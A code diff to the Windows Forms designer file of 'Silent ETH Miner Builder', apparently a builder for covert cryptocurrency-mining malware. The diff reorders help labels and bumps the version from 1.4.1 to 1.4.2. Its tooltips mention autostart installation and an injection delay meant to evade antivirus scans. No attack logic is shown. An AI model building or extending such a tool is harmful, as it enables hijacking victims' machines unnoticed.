@@ -37,13 +37,13 @@ Partial Class Form1
         Me.Label31 = New System.Windows.Forms.Label()
         Me.helpLabelInstall = New System.Windows.Forms.Label()
         Me.Label35 = New System.Windows.Forms.Label()
+        Me.Label18 = New System.Windows.Forms.Label()
+        Me.Label21 = New System.Windows.Forms.Label()
+        Me.helpLabelMaxCPU = New System.Windows.Forms.Label()
         Me.Label26 = New System.Windows.Forms.Label()
         Me.Label25 = New System.Windows.Forms.Label()
         Me.Label15 = New System.Windows.Forms.Label()
         Me.Label28 = New System.Windows.Forms.Label()
-        Me.Label21 = New System.Windows.Forms.Label()
-        Me.helpLabelMaxCPU = New System.Windows.Forms.Label()
-        Me.Label18 = New System.Windows.Forms.Label()
         Me.MephForm1 = New SilentETHMiner.MephTheme()
         Me.MephTabcontrol2 = New SilentETHMiner.MephTabcontrol()
         Me.TabPage1 = New System.Windows.Forms.TabPage()
@@ -294,6 +294,45 @@ Partial Class Form1
         Me.TooltipHelper.SetToolTip(Me.Label35, "The assembly information of the file, this information will also show up in the T" &
         "ask Manager and its autostart section if you have ""Install"" enabled.")
         '
+        'Label18
+        '
+        Me.Label18.AutoSize = True
+        Me.Label18.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label18.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label18.ForeColor = System.Drawing.Color.Teal
+        Me.Label18.Location = New System.Drawing.Point(71, 70)
+        Me.Label18.Name = "Label18"
+        Me.Label18.Size = New System.Drawing.Size(13, 13)
+        Me.Label18.TabIndex = 71
+        Me.Label18.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label18, "Only enable this if you're mining Ethereum Classic.")
+        '
+        'Label21
+        '
+        Me.Label21.AutoSize = True
+        Me.Label21.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label21.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label21.ForeColor = System.Drawing.Color.Teal
+        Me.Label21.Location = New System.Drawing.Point(388, 39)
+        Me.Label21.Name = "Label21"
+        Me.Label21.Size = New System.Drawing.Size(13, 13)
+        Me.Label21.TabIndex = 64
+        Me.Label21.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label21, resources.GetString("Label21.ToolTip"))
+        '
+        'helpLabelMaxCPU
+        '
+        Me.helpLabelMaxCPU.AutoSize = True
+        Me.helpLabelMaxCPU.Cursor = System.Windows.Forms.Cursors.Help
+        Me.helpLabelMaxCPU.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.helpLabelMaxCPU.ForeColor = System.Drawing.Color.Teal
+        Me.helpLabelMaxCPU.Location = New System.Drawing.Point(388, 10)
+        Me.helpLabelMaxCPU.Name = "helpLabelMaxCPU"
+        Me.helpLabelMaxCPU.Size = New System.Drawing.Size(13, 13)
+        Me.helpLabelMaxCPU.TabIndex = 62
+        Me.helpLabelMaxCPU.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.helpLabelMaxCPU, resources.GetString("helpLabelMaxCPU.ToolTip"))
+        '
         'Label26
         '
         Me.Label26.AutoSize = True
@@ -348,45 +387,6 @@ Partial Class Form1
         Me.TooltipHelper.SetToolTip(Me.Label28, "The time to wait before injecting and starting the miner. This bypasses some anti" &
         "virus scans!")
         '
-        'Label21
-        '
-        Me.Label21.AutoSize = True
-        Me.Label21.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label21.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label21.ForeColor = System.Drawing.Color.Teal
-        Me.Label21.Location = New System.Drawing.Point(388, 39)
-        Me.Label21.Name = "Label21"
-        Me.Label21.Size = New System.Drawing.Size(13, 13)
-        Me.Label21.TabIndex = 64
-        Me.Label21.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label21, resources.GetString("Label21.ToolTip"))
-        '
-        'helpLabelMaxCPU
-        '
-        Me.helpLabelMaxCPU.AutoSize = True
-        Me.helpLabelMaxCPU.Cursor = System.Windows.Forms.Cursors.Help
-        Me.helpLabelMaxCPU.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.helpLabelMaxCPU.ForeColor = System.Drawing.Color.Teal
-        Me.helpLabelMaxCPU.Location = New System.Drawing.Point(388, 10)
-        Me.helpLabelMaxCPU.Name = "helpLabelMaxCPU"
-        Me.helpLabelMaxCPU.Size = New System.Drawing.Size(13, 13)
-        Me.helpLabelMaxCPU.TabIndex = 62
-        Me.helpLabelMaxCPU.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.helpLabelMaxCPU, resources.GetString("helpLabelMaxCPU.ToolTip"))
-        '
-        'Label18
-        '
-        Me.Label18.AutoSize = True
-        Me.Label18.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label18.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label18.ForeColor = System.Drawing.Color.Teal
-        Me.Label18.Location = New System.Drawing.Point(71, 70)
-        Me.Label18.Name = "Label18"
-        Me.Label18.Size = New System.Drawing.Size(13, 13)
-        Me.Label18.TabIndex = 71
-        Me.Label18.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label18, "Only enable this if you're mining Ethereum Classic.")
-        '
         'MephForm1
         '
         Me.MephForm1.AccentColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer))
@@ -403,7 +403,7 @@ Partial Class Form1
         Me.MephForm1.Size = New System.Drawing.Size(535, 272)
         Me.MephForm1.SubHeader = "By Unam Sanctam, Credit to NYAN-x-CAT"
         Me.MephForm1.TabIndex = 0
-        Me.MephForm1.Text = "Silent ETH Miner Builder 1.4.1"
+        Me.MephForm1.Text = "Silent ETH Miner Builder 1.4.2"
         '
         'MephTabcontrol2
         '
